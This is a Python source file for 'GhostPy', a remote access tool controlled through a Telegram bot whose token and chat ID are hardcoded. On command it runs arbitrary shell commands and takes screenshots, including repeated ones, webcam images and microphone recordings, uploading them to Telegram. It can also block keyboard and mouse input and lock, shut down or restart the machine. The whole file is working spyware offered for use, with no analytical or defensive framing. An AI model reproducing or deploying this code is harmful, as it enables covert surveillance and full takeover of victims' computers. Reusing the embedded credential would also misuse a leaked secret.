import os
import cv2
import time
import json
import requests
import psutil
import socket
import platform
import threading
import numpy as np
import sounddevice as sd
import subprocess
from scipy.io.wavfile import write
from datetime import datetime
from PIL import ImageGrab
import logging
import ctypes
import sys

# === CONFIGURATION ===
BOT_TOKEN = "8177815827:AAEMBR1QoAXOoPrnHDZ31XHJGPJVzmGtv3A"
CHAT_ID = "1350603355"
POLL_INTERVAL = 5
COMMAND_COOLDOWN = 2
MAX_MIC_RECORD_SECONDS = 30
UPDATE_FILE = "last_update_id.txt"

# === LOGGING SETUP ===
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('ghostpy.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# === GLOBAL STATE ===
mic_recording = False
mic_data = []
mic_samplerate = 44100
active_threads = {}
last_command_time = 0
input_blocked = False

# === WINDOWS-SPECIFIC IMPORTS ===
if platform.system() == 'Windows':
    import win32api
    import win32con
    import win32gui

# === UPDATE ID PERSISTENCE ===
def save_update_id(uid):
    with open(UPDATE_FILE, "w") as f:
        f.write(str(uid))

def load_update_id():
    if os.path.exists(UPDATE_FILE):
        with open(UPDATE_FILE, "r") as f:
            return int(f.read().strip())
    return None

# === SECURITY FUNCTIONS ===
def is_authorized(sender_id):
    return str(sender_id) == CHAT_ID

def log_command(command):
    logger.info(f"Command received: {command}")
    with open("command_history.log", "a") as f:
        f.write(f"{datetime.now()}: {command}\n")

# === AUDIO HANDLING ===
def mic_callback(indata, frames, time, status):
    if mic_recording and len(mic_data) < (MAX_MIC_RECORD_SECONDS * mic_samplerate / 1000):
        mic_data.append(indata.copy())

def record_mic():
    global mic_recording
    try:
        with sd.InputStream(samplerate=mic_samplerate, channels=1, dtype='int16', callback=mic_callback):
            while mic_recording:
                sd.sleep(100)
    except Exception as e:
        logger.error(f"Microphone error: {e}")

def stop_mic_recording_and_save():
    if mic_data:
        output = os.path.join(os.getenv("TEMP"), "ghostpy_mic.wav")
        try:
            audio_np = np.concatenate(mic_data, axis=0)
            write(output, mic_samplerate, audio_np)
            return output
        except Exception as e:
            logger.error(f"Audio save error: {e}")
    return None

# === TELEGRAM API ===
def send_message(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg}
    try:
        response = requests.post(url, data=data, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logger.error(f"Message send failed: {e}")

def send_file(path):
    if not os.path.exists(path):
        send_message(f"[!] File not found: {path}")
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID}
            requests.post(url, files=files, data=data, timeout=20)
    except Exception as e:
        logger.error(f"File send failed: {e}")
    finally:
        try:
            os.remove(path)
        except:
            pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 100, "offset": offset}
    try:
        response = requests.get(url, params=params, timeout=110)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        logger.error(f"Update fetch failed: {e}")
        return {"ok": False, "result": []}

# === SYSTEM FUNCTIONS ===
def get_system_info():
    uname = platform.uname()
    info = [
        f"System: {uname.system}",
        f"Node: {uname.node}",
        f"Release: {uname.release}",
        f"Version: {uname.version}",
        f"Machine: {uname.machine}",
        f"Processor: {uname.processor}",
        f"IP Address: {socket.gethostbyname(socket.gethostname())}",
        f"CPU Usage: {psutil.cpu_percent()}%",
        f"Memory Usage: {psutil.virtual_memory().percent}%"
    ]
    return "\n".join(info)

def list_tasks():
    try:
        procs = [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]
        return "\n".join([f"{p['pid']}: {p['name']} (user: {p['username']})" for p in procs])
    except Exception as e:
        logger.error(f"Task list error: {e}")
        return "[!] Failed to get task list"

def capture_screenshot():
    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    try:
        img = ImageGrab.grab()
        img.save(path)
        return path
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return None

def capture_webcam():
    path = os.path.join(os.getenv("TEMP"), "webcam.png")
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(path, frame)
            return path
        return None
    except Exception as e:
        logger.error(f"Webcam error: {e}")
        return None

def screen_loop(interval):
    thread_id = threading.get_ident()
    active_threads[thread_id] = True
    while active_threads.get(thread_id, False):
        path = capture_screenshot()
        if path:
            send_file(path)
        time.sleep(interval)
    del active_threads[thread_id]

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        return output or "[✓] Command executed successfully (no output)"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out after 30 seconds"
    except Exception as e:
        return f"[!] Command execution failed: {str(e)}"

def open_application(app_name):
    try:
        if platform.system() == "Windows":
            # Try direct launch
            try:
                os.startfile(app_name)
                return f"[✓] Opened: {app_name}"
            except FileNotFoundError:
                # Try with .exe extension if not provided
                try:
                    if not app_name.endswith(".exe"):
                        os.startfile(app_name + ".exe")
                        return f"[✓] Opened: {app_name}.exe"
                except FileNotFoundError:
                    # Try full path from System32
                    system_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", app_name + ".exe")
                    if os.path.exists(system_path):
                        os.startfile(system_path)
                        return f"[✓] Opened from System32: {system_path}"
                    else:
                        return f"[!] App not found: {app_name}"
        elif platform.system() == "Darwin":  # macOS
            subprocess.run(["open", app_name])
            return f"[✓] Opened: {app_name}"
        else:  # Linux
            subprocess.run(["xdg-open", app_name])
            return f"[✓] Opened: {app_name}"
    except Exception as e:
        return f"[!] Failed to open {app_name}: {str(e)}"

def block_input():
    global input_blocked
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(True)
            input_blocked = True
            return "[✓] Input blocked - mouse/keyboard disabled"
        except Exception as e:
            return f"[!] Failed to block input: {str(e)}"
    return "[!] Input blocking only works on Windows"

def unblock_input():
    global input_blocked
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(False)
            input_blocked = False
            return "[✓] Input unblocked - mouse/keyboard enabled"
        except Exception as e:
            return f"[!] Failed to unblock input: {str(e)}"
    return "[!] Input unblocking only works on Windows"

def lock_screen():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.LockWorkStation()
            return "[✓] Screen locked"
        except Exception as e:
            return f"[!] Failed to lock screen: {str(e)}"
    elif platform.system() == "Darwin":  # macOS
        try:
            subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession", "-suspend"])
            return "[✓] Screen locked"
        except Exception as e:
            return f"[!] Failed to lock screen: {str(e)}"
    else:  # Linux
        try:
            subprocess.run(["xdg-screensaver", "lock"])
            return "[✓] Screen locked"
        except Exception as e:
            return f"[!] Failed to lock screen: {str(e)}"

def shutdown_system():
    try:
        if platform.system() == "Windows":
            os.system("shutdown /s /t 0")
        else:  # Linux/macOS
            os.system("shutdown -h now")
        return "[✓] System shutting down..."
    except Exception as e:
        return f"[!] Failed to shutdown: {str(e)}"

def restart_system():
    try:
        if platform.system() == "Windows":
            os.system("shutdown /r /t 0")
        else:  # Linux/macOS
            os.system("reboot now")
        return "[✓] System restarting..."
    except Exception as e:
        return f"[!] Failed to restart: {str(e)}"

# === COMMAND HANDLER ===
def handle_command(text):
    global mic_recording, mic_data, last_command_time, input_blocked
    current_time = time.time()
    if current_time - last_command_time < COMMAND_COOLDOWN:
        return
    last_command_time = current_time
    
    try:
        if text == "#help":
            send_message("""
🧠 *GhostPy Commands:*
#ping - Check status
#help - Show this help
#kill - Stop the bot
#tasklist - Show running processes
#sysinfo - Show system information
#screenshot - Take screenshot
#webcam - Capture webcam image
#screenloop:[sec] - Start screenshot loop
#stoploop - Stop all loops
#micin - Start microphone recording
#micout - Stop and send recording
#exec:<command> - Run shell command
#open:<appname> - Open application
#shutdown - Shutdown the PC
#restart - Restart the PC
#blockinput - Block mouse/keyboard (Windows)
#unblockinput - Unblock input
#lockscreen - Lock current session
""")
        elif text == "#ping":
            send_message("🟢 GhostPy online and responsive")
        elif text == "#kill":
            send_message("🔴 Shutting down GhostPy...")
            os._exit(0)
        elif text == "#tasklist":
            send_message(list_tasks())
        elif text == "#sysinfo":
            send_message(get_system_info())
        elif text == "#screenshot":
            if path := capture_screenshot():
                send_file(path)
            else:
                send_message("[!] Screenshot failed")
        elif text == "#webcam":
            if path := capture_webcam():
                send_file(path)
            else:
                send_message("[!] Webcam capture failed")
        elif text.startswith("#screenloop:"):
            try:
                interval = int(text.split(":")[1])
                if interval < 1 or interval > 60:
                    raise ValueError
                t = threading.Thread(target=screen_loop, args=(interval,), daemon=True)
                t.start()
                send_message(f"📸 Started screenshot loop every {interval}s")
            except:
                send_message("[!] Invalid interval (1-60s)")
        elif text == "#stoploop":
            active_threads.clear()
            send_message("🛑 Stopped all active loops")
        elif text == "#micin":
            if mic_recording:
                send_message("[!] Recording already in progress")
                return
            mic_recording = True
            mic_data = []
            t = threading.Thread(target=record_mic, daemon=True)
            t.start()
            send_message("🎙️ Microphone recording started...")
        elif text == "#micout":
            if not mic_recording:
                send_message("[!] No active recording")
                return
            mic_recording = False
            time.sleep(1)
            if path := stop_mic_recording_and_save():
                send_file(path)
                send_message("🎧 Recording sent")
            else:
                send_message("[!] Failed to save recording")
        elif text.startswith("#exec:"):
            cmd = text.split(":", 1)[1]
            if not cmd.strip():
                send_message("[!] No command provided")
                return
            output = execute_command(cmd)
            send_message(f"💻 Command output:\n{output}")
        elif text.startswith("#open:"):
            app = text.split(":", 1)[1]
            if not app.strip():
                send_message("[!] No application specified")
                return
            result = open_application(app)
            send_message(result)
        elif text == "#shutdown":
            send_message(shutdown_system())
        elif text == "#restart":
            send_message(restart_system())
        elif text == "#blockinput":
            if platform.system() != "Windows":
                send_message("[!] This command only works on Windows")
                return
            send_message(block_input())
        elif text == "#unblockinput":
            if platform.system() != "Windows":
                send_message("[!] This command only works on Windows")
                return
            send_message(unblock_input())
        elif text == "#lockscreen":
            send_message(lock_screen())
        else:
            send_message("[!] Unknown command. Send #help for options")
    except Exception as e:
        logger.error(f"Command handler error: {e}")
        send_message("[!] Command processing failed")

# === MAIN LOOP ===
def main():
    send_message("👻 GhostPy initialized and online")
    update_id = load_update_id()
    while True:
        try:
            updates = get_updates(update_id)
            if not updates.get("ok"):
                time.sleep(10)
                continue
            for result in updates.get("result", []):
                update_id = result["update_id"] + 1
                save_update_id(update_id)
                message = result.get("message", {})
                text = message.get("text", "").strip()
                sender_id = message.get("from", {}).get("id")
                if not is_authorized(sender_id):
                    continue
                log_command(text)
                handle_command(text)
            time.sleep(POLL_INTERVAL)
        except KeyboardInterrupt:
            send_message("🛑 GhostPy stopped by user")
            break
        except Exception as e:
            logger.error(f"Main loop error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.critical(f"Fatal error: {e}")